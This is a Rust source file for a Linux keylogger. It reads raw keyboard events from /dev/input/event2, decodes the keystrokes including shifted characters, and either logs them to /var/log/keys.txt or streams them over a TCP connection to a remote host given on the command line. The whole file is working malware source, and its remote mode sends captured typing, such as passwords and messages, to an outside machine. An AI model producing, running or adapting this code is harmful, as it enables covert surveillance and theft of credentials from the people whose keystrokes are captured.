use std::fs::File;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::env;

mod parse_input;
use parse_input::{get_input_code, get_input_type, get_key, get_key_shift};

fn main() {

    // define files to read from and write to
    let event_file = File::open("/dev/input/event2").expect("Failed to open event file");
    let keys_file = File::create("/var/log/keys.txt").expect("Failed to create keys file");

    // get args
    let args: Vec<String> = env::args().collect();

    // match arguments for upload type
    match args[1].as_str() {
        "-r" => {
            let addr = &args[2];
            let port = &args[3];
            let connection = TcpStream::connect(format!("{addr}:{port}")).expect("Failed to connect");
            write_remote(event_file, connection);
        },
        "-l" => write_local(event_file, keys_file),
        _ => panic!("Error in arguments")
    };
    
}

fn write_local(mut event_file: File, mut keys_file: File) {
    let mut shift: u8 = 0;
    loop {
        let mut buffer = [0u8; 72];
        let bytes_read = event_file.read(&mut buffer).expect("Failed to read from event file");
        let data = &buffer[..bytes_read];
        let mut builder = String::new();
        for element in data {
            builder += format!("{:02X}", element).as_str();
        } 

        let input_code = get_input_code(&builder);
        let input_type = get_input_type(&builder);
        let key = get_key(input_code);

        if ((key == "[LEFTSHIFT]") || (key == "[RIGHTSHIFT]")) && ((input_type == "01") || (input_type == "rpt")) {
            shift += 1;
        }

        if ((key == "[LEFTSHIFT]") || (key == "[RIGHTSHIFT]")) && ((input_type == "00")) {
            shift -= 1;
        }

        if (shift > 0) && ((input_type == "01") || (input_type == "rpt")) {
            let key = get_key_shift(input_code);
            keys_file.write_all(key.as_bytes()).expect("Failed to write to key file");
        }

        if (shift == 0) && ((input_type == "01") || (input_type == "rpt")) {
            let key = get_key(input_code);
            keys_file.write_all(key.as_bytes()).expect("Failed to write to key file");
        }
    }
}

fn write_remote(mut event_file: File, mut connection: TcpStream) {
    let mut shift: u8 = 0;
    loop {
        let mut buffer = [0u8; 72];
        let bytes_read = event_file.read(&mut buffer).expect("Failed to read from event file");
        let data = &buffer[..bytes_read];
        let mut builder = String::new();
        for element in data {
            builder += format!("{:02X}", element).as_str();
        } 

        let input_code = get_input_code(&builder);
        let input_type = get_input_type(&builder);
        let key = get_key(input_code);

        if ((key == "[LEFTSHIFT]") || (key == "[RIGHTSHIFT]")) && ((input_type == "01") || (input_type == "rpt")) {
            shift += 1;
        }

        if ((key == "[LEFTSHIFT]") || (key == "[RIGHTSHIFT]")) && ((input_type == "00")) {
            shift -= 1;
        }

        if (shift > 0) && ((input_type == "01") || (input_type == "rpt")) {
            let key = get_key_shift(input_code);
            connection.write(key.as_bytes()).expect("Failed to write to key file");
        }

        if (shift == 0) && ((input_type == "01") || (input_type == "rpt")) {
            let key = get_key(input_code);
            connection.write(key.as_bytes()).expect("Failed to write to key file");
        }
    }
}
